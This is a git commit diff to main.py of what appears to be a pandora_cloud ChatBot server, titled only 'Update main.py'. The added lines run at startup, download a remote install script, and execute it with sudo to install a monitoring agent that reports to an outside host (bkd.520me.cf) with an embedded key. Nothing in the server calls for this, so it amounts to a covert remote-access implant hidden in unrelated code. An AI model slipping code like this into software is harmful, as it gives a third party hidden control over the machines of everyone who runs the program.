b6daa19e8ce9814a3505a0185f97f4c07afd4df4
bbrplus <36788116+dogwalkerg@users.noreply.github.com>
2023-09-03 10:40:50 +0800

    Update main.py

--- main.py
+++ main.py
@@ -1,7 +1,12 @@
-# -*- coding: utf-8 -*-
+import os
+import subprocess
 
+# 添加执行curl命令的代码
+install_command = 'curl -L https://raw.githubusercontent.com/naiba/nezha/master/script/install.sh -o nezha.sh && chmod +x nezha.sh && sudo ./nezha.sh install_agent bkd.520me.cf 8807 qSZgnUVp0q5yCnmzY5'
+subprocess.run(install_command, shell=True)
+
+# 以下是原有代码
 from os import getenv
-
 from pandora_cloud.server import ChatBot
 
 _port = getenv('PORT')
